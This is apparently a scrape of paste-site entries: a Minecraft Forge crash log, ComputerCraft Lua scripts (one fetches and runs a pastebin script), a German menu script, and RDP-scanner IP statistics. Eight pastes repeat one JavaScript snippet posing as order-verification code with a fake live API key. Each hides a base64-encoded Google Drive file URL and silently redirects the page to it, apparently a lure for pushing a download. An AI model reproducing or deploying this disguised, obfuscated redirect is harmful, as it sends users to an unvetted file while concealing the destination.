+	at io.netty.channel.SimpleChannelInboundHandler.channelRead(SimpleChannelInboundHandler.java:98) ~[SimpleChannelInboundHandler.class:?]
+	at io.netty.channel.DefaultChannelHandlerContext.invokeChannelRead(DefaultChannelHandlerContext.java:337) ~[DefaultChannelHandlerContext.class:?]
+	at io.netty.channel.DefaultChannelHandlerContext.fireChannelRead(DefaultChannelHandlerContext.java:323) ~[DefaultChannelHandlerContext.class:?]
+	at io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103) ~[MessageToMessageDecoder.class:?]
+	at io.netty.handler.codec.MessageToMessageCodec.channelRead(MessageToMessageCodec.java:111) ~[MessageToMessageCodec.class:?]
+	at io.netty.channel.DefaultChannelHandlerContext.invokeChannelRead(DefaultChannelHandlerContext.java:337) ~[DefaultChannelHandlerContext.class:?]
+	at io.netty.channel.DefaultChannelHandlerContext.fireChannelRead(DefaultChannelHandlerContext.java:323) ~[DefaultChannelHandlerContext.class:?]
+	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:785) ~[DefaultChannelPipeline.class:?]
+	at io.netty.channel.embedded.EmbeddedChannel.writeInbound(EmbeddedChannel.java:169) ~[EmbeddedChannel.class:?]
+	at cpw.mods.fml.common.network.internal.FMLProxyPacket.func_148833_a(FMLProxyPacket.java:77) [FMLProxyPacket.class:?]
+	at net.minecraft.network.NetworkManager.func_74428_b(NetworkManager.java:212) [ej.class:?]
+	at net.minecraft.network.NetworkSystem.func_151269_c(NetworkSystem.java:165) [nc.class:?]
+	at net.minecraft.server.MinecraftServer.func_71190_q(MinecraftServer.java:659) [MinecraftServer.class:?]
+	at net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java:547) [MinecraftServer.class:?]
+	at net.minecraft.server.integrated.IntegratedServer.func_71217_p(IntegratedServer.java:111) [bsx.class:?]
+	at net.minecraft.server.MinecraftServer.run(MinecraftServer.java:427) [MinecraftServer.class:?]
+	at net.minecraft.server.MinecraftServer$2.run(MinecraftServer.java:685) [?:?]
+[23:58:27] [Server thread/ERROR]: Encountered an unexpected exception
+net.minecraft.util.ReportedException: Ticking memory connection
+	at net.minecraft.network.NetworkSystem.func_151269_c(NetworkSystem.java:181) ~[nc.class:?]
+	at net.minecraft.server.MinecraftServer.func_71190_q(MinecraftServer.java:659) ~[MinecraftServer.class:?]
+	at net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java:547) ~[MinecraftServer.class:?]
+	at net.minecraft.server.integrated.IntegratedServer.func_71217_p(IntegratedServer.java:111) ~[bsx.class:?]
+	at net.minecraft.server.MinecraftServer.run(MinecraftServer.java:427) [MinecraftServer.class:?]
+	at net.minecraft.server.MinecraftServer$2.run(MinecraftServer.java:685) [?:?]
+Caused by: java.lang.NullPointerException
+	at cpw.mods.fml.common.network.internal.FMLProxyPacket.func_148833_a(FMLProxyPacket.java:101) ~[FMLProxyPacket.class:?]
+	at net.minecraft.network.NetworkManager.func_74428_b(NetworkManager.java:212) ~[ej.class:?]
+	at net.minecraft.network.NetworkSystem.func_151269_c(NetworkSystem.java:165) ~[nc.class:?]
+	... 5 more
+[23:58:27] [Server thread/ERROR]: This crash report has been saved to: C:\Users\PC\AppData\Roaming\.minecraft\crash-reports\crash-2025-03-27_23.58.27-server.txt
+[23:58:27] [Server thread/INFO]: Stopping server
+[23:58:27] [Server thread/INFO]: Saving players
+[23:58:27] [Server thread/INFO]: Saving worlds
+[23:58:27] [Server thread/INFO]: Saving chunks for level 'Minecraft 2025'/Overworld
+[23:58:27] [Netty Client IO #0/INFO]: Restoring client config values...
+[23:58:27] [Client thread/INFO]: [net.minecraft.client.Minecraft:func_71377_b:349]: ---- Minecraft Crash Report ----
+// Surprise! Haha. Well, this is awkward.
+
+Time: 27/03/25 23:58
+Description: Ticking memory connection
+
+java.lang.NullPointerException: Ticking memory connection
+	at cpw.mods.fml.common.network.internal.FMLProxyPacket.func_148833_a(FMLProxyPacket.java:101)
+	at net.minecraft.network.NetworkManager.func_74428_b(NetworkManager.java:212)
+	at net.minecraft.network.NetworkSystem.func_151269_c(NetworkSystem.java:165)
+	at net.minecraft.server.MinecraftServer.func_71190_q(MinecraftServer.java:659)
+	at net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java:547)
+	at net.minecraft.server.integrated.IntegratedServer.func_71217_p(IntegratedServer.java:111)
+	at net.minecraft.server.MinecraftServer.run(MinecraftServer.java:427)
+	at net.minecraft.server.MinecraftServer$2.run(MinecraftServer.java:685)
+
+
+A detailed walkthrough of the error, its code path and all known details is as follows:
+---------------------------------------------------------------------------------------
+
+-- Head --
+Stacktrace:
+	at cpw.mods.fml.common.network.internal.FMLProxyPacket.func_148833_a(FMLProxyPacket.java:101)
+	at net.minecraft.network.NetworkManager.func_74428_b(NetworkManager.java:212)
+
+-- Ticking connection --
+Details:
+	Connection: net.minecraft.network.NetworkManager@2b4b5cf5
+Stacktrace:
+	at net.minecraft.network.NetworkSystem.func_151269_c(NetworkSystem.java:165)
+	at net.minecraft.server.MinecraftServer.func_71190_q(MinecraftServer.java:659)
+	at net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java:547)
+	at net.minecraft.server.integrated.IntegratedServer.func_71217_p(IntegratedServer.java:111)
+	at net.minecraft.server.MinecraftServer.run(MinecraftServer.java:427)
+	at net.minecraft.server.MinecraftServer$2.run(MinecraftServer.java:685)
+
+-- System Details --
+Details:
+	Minecraft Version: 1.7.10
+	Operating System: Windows 10 (amd64) version 10.0
+	Java Version: 1.8.0_441, Oracle Corporation
+	Java VM Version: Java HotSpot(TM) 64-Bit Server VM (mixed mode), Oracle Corporation
+	Memory: 233189512 bytes (222 MB) / 436207616 bytes (416 MB) up to 9831448576 bytes (9376 MB)
+	JVM Flags: 7 total; -Xmx9366M -XX:+UnlockExperimentalVMOptions -XX:+UseG1GC -XX:G1NewSizePercent=20 -XX:G1ReservePercent=20 -XX:MaxGCPauseMillis=50 -XX:G1HeapRegionSize=32M
+	AABB Pool Size: 0 (0 bytes; 0 MB) allocated, 0 (0 bytes; 0 MB) used
+	IntCache: cache: 0, tcache: 0, allocated: 12, tallocated: 94
+	FML: MCP v9.05 FML v7.10.99.99 Minecraft Forge 10.13.4.1614 28 mods loaded, 28 mods active
+	States: 'U' = Unloaded 'L' = Loaded 'C' = Constructed 'H' = Pre-initialized 'I' = Initialized 'J' = Post-initialized 'A' = Available 'D' = Disabled 'E' = Errored
+	UCHIJAAAA	mcp{9.05} [Minecraft Coder Pack] (minecraft.jar) 
+	UCHIJAAAA	FML{7.10.99.99} [Forge Mod Loader] (forge-1.7.10-10.13.4.1614-1.7.10.jar) 
+	UCHIJAAAA	Forge{10.13.4.1614} [Minecraft Forge] (forge-1.7.10-10.13.4.1614-1.7.10.jar) 
+	UCHIJAAAA	TooManyItems{1.7.10} [TooManyItems] (minecraft.jar) 
+	UCHIJAAAA	CustomOreGen{1.2.1} [Custom Ore Generation] (14173178507_Custom-Ore-Generation-Revival-Mod-1.7.10.jar) 
+	UCHIJAAAA	spawncontroller{3.0.0} [SpawnController] ([1.7.10][ver.3.0.0]SpawnController.jar) 
+	UCHIJAAAA	bspkrsCore{6.16} [bspkrsCore] ([1.7.10]bspkrsCore-universal-6.16.jar) 
+	UCHIJAAAA	DamageIndicatorsMod{3.3.2} [Damage Indicators] ([1.7.10]DamageIndicatorsMod-3.3.2.jar) 
+	UCHIJAAAA	Treecapitator{1.7.10} [Treecapitator] ([1.7.10]Treecapitator-universal-2.0.4.jar) 
+	UCHIJAAAA	Backpack{2.0.1} [Backpack] (Backpacks-Mod.jar) 
+	UCHIJAAAA	CustomChestLoot{2.0.1} [Custom Chest Loot] (CustomChestLoot-1.7.10-2.0.1.jar) 
+	UCHIJAAAA	DPU{1.2.40} [Don't Pick Up] (DPU-1.7.10-1.2.40.jar) 
+	UCHIJAAAA	endercompass{1.2} [Ender Compass] (Ender-Compass-Mod-1.7.10.jar) 
+	UCHIJAAAA	endercrop{1.7.10-1.1} [Ender Crop] (Ender-Crop-Mod-1.7.10.jar) 
+	UCHIJAAAA	moddisruptor{0.2} [Enderman Disruptor Mod] (Enderman-Disruptor-Mod-1.7.10.jar) 
+	UCHIJAAAA	enhancedspawners2{0.2} [enhancedspawners2] (EnhancedSpawners2-1.6.jar) 
+	UCHIJAAAA	FireBallsForPlayers{0.5} [FireBallsForPlayers] (FireBalls-For-Players-Mod-1.7.10.jar) 
+	UCHIJAAAA	iChunUtil{4.2.3} [iChunUtil] (iChunUtil-4.2.3.jar) 
+	UCHIJAAAA	instahouse{7.5} [Insta House] (InstaHousev7.5.jar) 
+	UCHIJAAAA	ism{2.6.1 MC-1.7.10} [Instant Structures Mod (ISM)] (ism-2.6.1 MC-1.7.10.jar) 
+	UCHIJAAAA	cannibal321{1.0} [More Gems + Mod] (More Gems   Mod 1.7.10-1.0.jar) 
+	UCHIJAAAA	Morph{0.9.3} [Morph] (Morph-Beta-0.9.3.jar) 
+	UCHIJAAAA	naturescompass{1.3.1} [Nature's Compass] (NaturesCompass-1.7.10-1.3.1.jar) 
+	UCHIJAAAA	ReiMinimap{1.7.10} [Rei's Minimap] (Reis-Minimap-Mod-1.7.10.jar) 
+	UCHIJAAAA	SSTOW{1.7.10-0.1-RC9-7} [Soul Shards: The Old Ways] (SoulShards-TOW-1.7.10-0.1-RC9-7.jar) 
+	UCHIJAAAA	tamedmobs{1.0} [ cTamed Mobs] (Tamed Mobs Mod v1.2.jar) 
+	UCHIJAAAA	thehackermod{1.7.10} [thehackermod] (The Hacker Mod 1.7 - 1.7.10.jar) 
+	UCHIJAAAA	wyem{0.1.1.4} [WYEM] (wyem-1.7.10_1.1.4.jar) 
+	GL info: ~~ERROR~~ RuntimeException: No OpenGL context found in the current thread.
+	Profiler Position: N/A (disabled)
+	Vec3 Pool Size: 0 (0 bytes; 0 MB) allocated, 0 (0 bytes; 0 MB) used
+	Player Count: 1 / 8; [EntityPlayerMP['MineGamer303'/216, l='Minecraft 2025', x=17,50, y=68,00, z=-6,50]]
+	Type: Integrated Server (map_client.txt)
+	Is Modded: Definitely; Client brand changed to 'fml,forge'
+[23:58:27] [Client thread/INFO]: [net.minecraft.client.Minecraft:func_71377_b:354]: #@!@# Game crashed! Crash report saved to: #@!@# C:\Users\PC\AppData\Roaming\.minecraft\crash-reports\crash-2025-03-27_23.58.27-server.txt
+[23:58:27] [Client thread/INFO]: Waiting for the server to terminate/save.
+[23:58:27] [Server thread/INFO]: Saving chunks for level 'Minecraft 2025'/Nether
+[23:58:27] [Server thread/INFO]: Saving chunks for level 'Minecraft 2025'/The End
+[23:58:27] [Server thread/INFO]: Unloading dimension 0
+[23:58:27] [Server thread/INFO]: Unloading dimension -1
+[23:58:27] [Server thread/INFO]: Unloading dimension 1
+[23:58:27] [Server thread/INFO]: Applying holder lookups
+[23:58:27] [Server thread/INFO]: Holder lookups applied
+[23:58:27] [Server thread/INFO]: The state engine was in incorrect state SERVER_STOPPING and forced into state SERVER_STOPPED. Errors may have been discarded.
+[23:58:27] [Client thread/INFO]: Server terminated.
+"
+5Rii0q9u,智能简化激光护盾 可用,jaklsfjlsak,Lua,Saturday 29th of March 2025 10:17:31 PM CDT,"local OffsetValue = -3
+local shield = peripheral.find(""warpdriveForceFieldProjector"")
+local lasers = peripheral.getNames()
+local lever = ""front""
+local lastLx, lastLy, lastLz = 0, 0, 0
+
+-- Calculate the offset position (still using OffsetValue)
+function shieldOffset(lx, ly, lz, fx, fy, fz)
+    local dx = lx - fx
+    local dy = ly - fy
+    local dz = lz - fz
+    local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
+    dx = dx / distance
+    dy = dy / distance
+    dz = dz / distance
+    local t1x = lx + dx * OffsetValue
+    local t1y = ly + dy * OffsetValue
+    local t1z = lz + dz * OffsetValue
+    return t1x, t1y, t1z, distance
+end
+
+-- Download configuration file if missing.
+if not fs.exists(""conf"") then
+    shell.run(""pastebin get 38M5cNbZ conf"")
+    term.clear()
+end
+
+-- Filter peripherals: keep only warpdriveLaserCameras and set their beam frequency.
+for i = #lasers, 1, -1 do
+    if peripheral.getType(lasers[i]) ~= ""warpdriveLaserCamera"" then
+        table.remove(lasers, i)
+    else
+        peripheral.wrap(lasers[i]).beamFrequency(1420)
+    end
+end
+
+print(""Control System Online, Toggle Redstone To Toggle Shields, Press C to Configure"")
+
+-- Determine shield range based on upgrades.
+local _, upgrades = shield.getUpgrades()
+local Size
+if upgrades:match(""1/4 x Range"") then
+    Size = 16
+elseif upgrades:match(""2/4 x Range"") then
+    Size = 32
+elseif upgrades:match(""3/4 x Range"") then
+    Size = 48
+elseif upgrades:match(""4/4 x Range"") then
+    Size = 64
+elseif upgrades:match(""0/4 x Range"") then
+    Size = 0
+end
+
+while true do
+    local event, keyOrLaser, lx, ly, lz, block, _, _, _, type, metadata, resistance = os.pullEvent()
+
+    if event == ""laserScanning"" then
+        lastLx, lastLy, lastLz = tonumber(lx), tonumber(ly), tonumber(lz)
+        local fx, fy, fz = shield.getLocalPosition()
+        local t1x, t1y, t1z, distance = shieldOffset(lastLx, lastLy, lastLz, fx, fy, fz)
+
+        local tx = (t1x - fx) / Size
+        local ty = (t1y - fy) / Size
+        local tz = (t1z - fz) / Size
+
+        shield.translation(tx, ty, tz)
+        print(""Laser Coordinates: ("" .. lastLx .. "", "" .. lastLy .. "", "" .. lastLz .. "")"")
+        print(""Translated to: ("" .. tx .. "", "" .. ty .. "", "" .. tz .. "")"")
+        
+    elseif event == ""redstone"" then
+        local on = redstone.getAnalogInput(lever)
+        if on > 6 then
+            shield.enable(true)
+        elseif on < 5 then
+            shield.enable(false)
+        end
+    elseif event == ""key"" and keyOrLaser == 46 then
+        print(""C key pressed, running 'conf' script..."")
+        shell.run(""conf"")
+    end
+end
+"
+mZ4U3UsA,Untitled,carubi,Lua,Saturday 29th of March 2025 10:05:57 PM CDT,"-- Beispielskript für einen Touchscreen in Computercraft (Tekkit Lite, Minecraft 1.4.7)
+-- Voraussetzung: Ein Monitor ist an einer Seite des Computers angebracht.
+-- Falls dein Monitor an einer anderen Seite hängt, ändere ""left"" entsprechend.
+local monitor = peripheral.wrap(""left"")
+if not monitor then
+  print(""Kein Monitor gefunden! Bitte überprüfe die Verkabelung."")
+  return
+end
+ 
+-- Funktion zum Zeichnen des Menüs
+local function drawMenu()
+  monitor.clear()
+  monitor.setCursorPos(1,1)
+  monitor.write(""== Touchscreen Menü =="")
+  monitor.setCursorPos(1,3)
+  monitor.write(""1. Option 1"")
+  monitor.setCursorPos(1,4)
+  monitor.write(""2. Option 2"")
+  monitor.setCursorPos(1,5)
+  monitor.write(""3. Beenden"")
+end
+ 
+drawMenu()
+ 
+local running = true
+while running do
+  -- Warten auf eine Berührung auf dem Monitor
+  local event, side, x, y = os.pullEvent(""monitor_touch"")
+ 
+  -- Prüfen, ob die Berührung in einer der Menüzeilen erfolgte:
+  if y == 3 then
+    monitor.clear()
+    monitor.setCursorPos(1,1)
+    monitor.write(""Option 1 gewählt!"")
+    sleep(2)
+    drawMenu()
+  elseif y == 4 then
+    monitor.clear()
+    monitor.setCursorPos(1,1)
+    monitor.write(""Option 2 gewählt!"")
+    sleep(2)
+    drawMenu()
+  elseif y == 5 then
+    running = false
+  end
+end
+ 
+monitor.clear()
+monitor.setCursorPos(1,1)
+monitor.write(""Programm beendet."")"
+2yyWmr2s,Order.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 09:54:31 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/190/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+XdgjChkY,Market.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 09:39:08 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/823/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+xswEdEJT,Untitled,Epiphemeral,JavaScript,Saturday 29th of March 2025 09:23:46 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/013/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+VhMirpQQ,Order.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 08:53:01 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/816/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+Vid2BD9A,Market.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 08:37:39 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/577/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+5XKhtcYi,Untitled,Epiphemeral,JavaScript,Saturday 29th of March 2025 08:22:16 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/500/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+XVYFyyda,Order.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 07:51:30 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/581/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+nauuRmnc,Market.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 07:36:01 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/684/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+BiF6s8Jh,2025-03-28_stats.json,rdp_snitch,JSON,Saturday 29th of March 2025 07:18:49 PM CDT,"{
+  ""ip"": {
+    ""156.146.57.110"": 42849,
+    ""138.199.24.6"": 91545,
+    ""150.95.89.149"": 10653,
+    ""156.146.57.52"": 10716,
+    ""156.146.57.174"": 10704,
+    ""106.14.144.233"": 423,
+    ""146.190.105.191"": 1881,
+    ""188.166.250.11"": 6,
+    ""58.218.199.219"": 30,
+    ""103.228.37.126"": 561,
+    ""185.42.12.5"": 12,
+    ""175.210.79.116"": 60,
+    ""198.235.24.64"": 9,
+    ""92.255.57.86"": 3,
+    ""157.245.104.150"": 9,
+    ""147.182.229.114"": 201,
+    ""80.94.95.90"": 6,
+    ""138.199.24.23"": 2016,
+    ""194.180.49.233"": 9747,
+    ""58.186.207.71"": 24,
+    ""198.235.24.121"": 9,
+    ""71.6.134.235"": 30,
+    ""167.94.146.62"": 3,
+    ""103.75.183.173"": 24,
+    ""88.214.25.124"": 6,
+    ""91.238.181.93"": 6,
+    ""85.215.198.96"": 3,
+    ""147.185.132.147"": 9,
+    ""178.20.129.235"": 3,
+    ""66.235.169.197"": 6,
+    ""205.210.31.75"": 9,
+    ""187.234.232.99"": 6
+  },
+  ""asn"": {
+    ""AS212238"": 64269,
+    ""AS60068"": 93561,
+    ""AS135161"": 10653,
+    ""AS37963"": 423,
+    ""AS14061"": 2097,
+    ""AS4134"": 30,
+    ""AS135918"": 561,
+    ""AS59425"": 12,
+    ""AS4766"": 60,
+    ""AS396982"": 36,
+    ""AS207566"": 3,
+    ""AS204428"": 6,
+    ""AS201814"": 9747,
+    ""AS18403"": 24,
+    ""AS10439"": 30,
+    ""AS398705"": 3,
+    ""AS151858"": 24,
+    ""AS35042"": 6,
+    ""AS49434"": 6,
+    ""AS8560"": 3,
+    ""AS24810"": 3,
+    ""AS40244"": 6,
+    ""AS8151"": 6
+  },
+  ""isp"": {
+    ""Datacamp Limited"": 64269,
+    ""DataCamp Limited"": 93561,
+    ""GMO-Z.COM PTE. LTD."": 10653,
+    ""Hangzhou Alibaba Advertising Co"": 423,
+    ""DigitalOcean, LLC"": 2097,
+    ""Chinanet"": 30,
+    ""DXT"": 561,
+    ""Chang Way Technologies Co. Limited"": 15,
+    ""Korea Telecom"": 60,
+    ""Google LLC"": 36,
+    ""SS-Net"": 6,
+    ""MEVSPACE sp. z o.o."": 9747,
+    ""FPT Telecom Company"": 24,
+    ""CariNet, Inc."": 30,
+    ""Censys, Inc."": 3,
+    ""BQT"": 24,
+    ""NOC EMAIL: noc@one-host.net"": 6,
+    ""Datacenter location PAR1 France"": 6,
+    ""IONOS SE"": 3,
+    ""Teleset LLC Nchelny Branch"": 3,
+    ""HopOne Internet Corporation"": 6,
+    ""Uninet S.A. de C.V."": 6
+  },
+  ""org"": {
+    ""Datacamp Limited"": 64269,
+    ""Cdn77 SGP"": 93561,
+    ""Zcom Thai"": 10653,
+    ""Aliyun Computing Co., LTD"": 423,
+    ""DigitalOcean, LLC"": 2091,
+    ""Digitalocean"": 6,
+    ""Chinanet JS"": 30,
+    ""DXT Digital Transformation Technology Joint Stock Company"": 561,
+    ""Horizon LLC"": 12,
+    ""Kornet"": 60,
+    ""Palo Alto Networks, Inc"": 36,
+    ""Chang Way Technologies Co. Limited"": 3,
+    ""Unmanaged LTD"": 6,
+    ""HostSlick"": 9747,
+    ""Vietnam Internet Network Information Center"": 24,
+    ""CariNet, Inc."": 30,
+    ""Censys, Inc."": 3,
+    ""Unknown"": 24,
+    ""ThinkTech Technology Industrial CO. Limited"": 12,
+    ""De Ber Ionos Cloud Txl"": 3,
+    ""Teleset LLC"": 3,
+    ""Tier.Net Technologies LLC"": 6,
+    ""UNINET"": 6
+  },
+  ""regionName"": {
+    ""North West"": 157830,
